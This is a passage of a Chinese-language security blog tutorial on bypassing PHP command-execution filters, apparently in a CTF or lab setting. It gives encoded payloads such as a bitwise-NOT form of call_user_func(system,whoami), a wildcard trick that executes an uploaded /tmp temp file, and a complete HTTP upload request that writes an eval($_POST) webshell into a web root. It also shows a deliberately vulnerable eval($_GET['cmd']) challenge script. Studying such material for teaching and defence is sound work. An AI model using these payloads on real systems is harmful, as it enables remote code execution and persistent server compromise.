class="line">`(call_user_func)(system,whoami,&#x27;&#x27;);`等同于`(~%9c%9e%93%93%a0%8a%8c%9a%8d%a0%99%8a%91%9c)(~%8c%86%8c%8b%9a%92,~%88%97%90%9e%92%96,&#x27;&#x27;);`  </span><br><span class="line">**PHP5**  </span><br><span class="line">文件读取：   </span><br><span class="line">PHP中POST上传文件会把我们上传的文件暂时存在/tmp目录下,   </span><br><span class="line">默认文件名是phpXXXXXX，文件名最后6个字符是随机的大小写字母。  </span><br><span class="line">使用通配符`?`:`./???/?????????`可以匹配到`./tmp/phpXXXXXX`,不过能匹配到的东西太多，通常会报错  </span><br><span class="line">所以将最后一个`?`改为`[@-[]`,`[@-[]`表示ASCII在`@`和`[`之间的字符，也就是大写字母，保障最后一位是大写字母  </span><br><span class="line">步骤一：先构造一个文件上传的POST数据包；</span><br><span class="line">步骤二：PHP页面生成临时文件phpXXXXXX，存储在/tmp目录下；</span><br><span class="line">步骤三：执行指令`./???/????????[@-[]`，读取文件，执行其中指令；  </span><br><span class="line">步骤四：在上传的文件中写入一句话木马，把木马生成位置指定一个绝对路径，直接执行。  </span><br><span class="line">此为上传的数据包</span><br></pre></td></tr></table></figure>
<p>POST &#x2F;php_cmd&#x2F;php80&#x2F;class11&#x2F;3.php?cmd&#x3D;?%3E%3C?&#x3D;<code>.+/%3f%3f%3f/%3f%3f%3f%3f%3f%3f%3f%3f[%40-[]</code>%3b?%3E HTTP&#x2F;1.1<br>Host: localhost<br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;83.0.4103.116 Safari&#x2F;537.36<br>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,<em>&#x2F;</em>;q&#x3D;0.8<br>Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2<br>Content-Type: multipart&#x2F;form-data;boundary&#x3D;——–123<br>Accept-Encoding: gzip, deflate<br>Connection:close<br>Upgrade-Insecure-Requests: 1<br>Content-Length: 144<br>&#x2F;&#x2F;此处有一行空行<br>——–123<br>Content-Disposition:form-data;name&#x3D;”file”;filename&#x3D;”1.txt”<br>&#x2F;&#x2F;此处也有一行空行<br>echo “&lt;?php eval($_POST[‘shell’]);” &gt; &#x2F;www&#x2F;admin&#x2F;localhost_80&#x2F;wwwroot&#x2F;class11&#x2F;success.php<br>——–123</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">创建成功后使用蚁剑连接即可  </span><br><span class="line">使用一句话木马需要知道绝对路径，可以使用反弹shell  </span><br><span class="line">**无字母数字过滤;~^`&amp;|**  </span><br></pre></td></tr></table></figure>
<?php
highlight_file(__FILE__);
error_reporting(0);
if(!preg_match('/[a-z0-9;~^`&|]/is',$_GET['cmd'])) {
    eval($_GET['cmd']);
}
```
`~`,`^`都被过滤，可以使用自增法构造，`;`被过滤，可以使用短标签法代替  
















</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2022-06-14</span><i class="fa fa-tag"></i><a class="tag" href="/tags/web基础/" title="web基础">web基础 </a></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" target="_blank" rel="noopener" href="http://twitter.com/home?status=,http://example.com/2022/06/14/PHP命令执行从0到1/,2js56's blog,PHP命令执行从0到1,;"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2022/06/29/SSTI%E9%80%9A%E5%A4%A9%E6%8C%87%E5%8C%97/" title="SSTI通天指北">Post anterior</a></li><li class="next pagbuttons"><a class="btn" role="navigation" href="/2022/05/24/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" title="文件上传">Post siguiente</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>